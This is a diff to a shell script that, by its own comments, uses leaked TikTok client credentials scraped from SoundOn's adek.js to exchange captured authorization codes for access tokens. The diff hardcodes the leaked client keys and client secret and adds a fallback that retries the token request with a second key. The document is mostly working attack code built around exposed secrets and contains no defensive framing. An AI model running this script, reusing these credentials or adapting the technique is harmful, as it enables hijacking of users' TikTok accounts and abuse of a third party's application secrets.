@@ -3,8 +3,10 @@
 # Uses the LEAKED TikTok client credentials from SoundOn's adek.js
 # to exchange a captured authorization code for an access token.
 
-LEAKED_CLIENT_KEY="awulj3e36brrh086"
-LEAKED_CLIENT_SECRET="e63acb9afab646ee9340f16a2380b1ed"
+# Both client_keys share the same leaked client_secret
+BROWSER_KEY="awcdygtcjh22v33k"      # Used in TikTok authorize URL (browser flow)
+SERVER_KEY="awulj3e36brrh086"       # Used for server-to-server token exchange
+LEAKED_CLIENT_SECRET="e63acb9afab646ee9340f16a2380b1ed"  # Works for BOTH keys!
 TOKEN_URL="https://open-api.tiktok.com/oauth/access_token/"
 
 if [ -z "$1" ]; then
@@ -32,14 +34,31 @@ echo ""
 echo "Authorization code: ${AUTH_CODE:0:20}..."
 echo ""
 
+echo "Trying browser-side key: $BROWSER_KEY"
 RESPONSE=$(curl -s -w "\n%{http_code}" "$TOKEN_URL" \
   -H "Content-Type: application/json" \
   -d "{
-    \"client_key\": \"$LEAKED_CLIENT_KEY\",
+    \"client_key\": \"$BROWSER_KEY\",
     \"client_secret\": \"$LEAKED_CLIENT_SECRET\",
     \"code\": \"$AUTH_CODE\",
     \"grant_type\": \"authorization_code\"
   }" --max-time 15 2>/dev/null)
+
+HTTP_CODE=$(echo "$RESPONSE" | tail -1)
+BODY=$(echo "$RESPONSE" | sed '$d')
+
+# If browser key fails with 10014 (key mismatch), try server key
+if echo "$BODY" | grep -q "10014"; then
+  echo "Browser key rejected. Trying server-side key: $SERVER_KEY"
+  RESPONSE=$(curl -s -w "\n%{http_code}" "$TOKEN_URL" \
+    -H "Content-Type: application/json" \
+    -d "{
+      \"client_key\": \"$SERVER_KEY\",
+      \"client_secret\": \"$LEAKED_CLIENT_SECRET\",
+      \"code\": \"$AUTH_CODE\",
+      \"grant_type\": \"authorization_code\"
+    }" --max-time 15 2>/dev/null)
+fi
 
 HTTP_CODE=$(echo "$RESPONSE" | tail -1)
 BODY=$(echo "$RESPONSE" | sed '$d')
